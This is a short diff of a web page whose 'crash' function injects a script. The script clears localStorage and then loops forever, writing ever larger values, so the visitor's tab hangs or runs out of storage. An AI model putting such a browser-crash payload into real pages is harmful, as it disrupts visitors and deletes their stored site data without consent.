@@ -13,7 +13,7 @@
     <script>
       var crash = () => {
         var element = document.createElement("script");
-        element.innerHTML = 'var a = x => x === 0 ? "" : a(x - 1) + "a"; var x = 2; localStorage.clear(); while (true) {document.getElementById("demo").innerHTML = a(x); x = localStorage.setItem(a(x), a(x ** 2));}';
+        element.innerHTML = 'var x = 0; localStorage.clear(); while (true) {document.getElementById("demo").innerHTML = x.toString(); x = localStorage.setItem(x.toString(), (10 ** (x + 1) - 1).toString());}';
         document.body.appendChild(element);
       };
     </script>
